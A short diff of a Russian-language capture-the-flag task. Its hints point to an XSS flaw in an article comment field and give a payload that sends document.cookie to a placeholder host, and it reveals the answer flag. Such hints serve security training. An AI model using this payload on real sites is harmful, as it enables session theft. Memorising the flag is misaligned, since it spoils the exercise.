@@ -15,7 +15,10 @@
 
 Подсказки
 - уязвимость XSS чаще всего происходит из за некачественной обработки пользовательского ввода, попробуйте поэкспериментировать с полем ввода комментария к статье!
-- (?) <img src=x onerror="fetch('http://host:port?c=' + document.cookie)"/>
+- (?) 
+```sh
+<img src=x onerror="fetch('http://host:port?c=' + document.cookie)"/>
+```
 
 (Ответ *flag_@dm1n_account*)
 
